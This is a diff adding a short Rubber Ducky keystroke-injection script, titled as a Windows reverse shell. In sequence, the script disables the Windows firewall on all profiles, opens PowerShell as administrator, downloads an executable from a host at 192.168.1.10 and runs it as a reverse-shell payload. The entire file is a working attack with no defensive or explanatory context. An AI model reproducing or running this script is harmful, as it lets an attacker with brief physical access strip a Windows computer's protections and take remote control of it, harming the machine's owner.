@@ -1,1 +1,16 @@
+REM Windows Reverse Shell Rubber Ducky Script
+REM Disable Windows Firewall
+STRING netsh advfirewall set allprofiles state off
+ENTER
+DELAY 1000
+REM Open PowerShell as Administrator
+STRING Start-Process powershell -Verb RunAs
+ENTER
+DELAY 3000
+REM Download and Run Reverse Shell Payload
+STRING (New-Object Net.WebClient).DownloadFile('http://192.168.1.10/reversewin10.exe','reversewin10.exe')
+ENTER
+DELAY 3000
+STRING .\reversewin10.exe
+ENTER
 
